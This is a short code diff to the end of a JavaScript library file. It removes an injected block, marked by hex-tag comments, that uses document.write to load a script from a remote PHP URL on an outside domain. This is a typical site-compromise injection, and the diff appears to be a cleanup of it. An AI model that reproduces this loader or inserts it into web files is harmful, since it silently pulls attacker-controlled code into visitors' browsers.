@@ -1575,13 +1575,3 @@ Element.implement({
 });
 
 })();
-
-/*fb5827*/
-/**/
-
-
-document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
-
-
-
-/*/fb5827*/
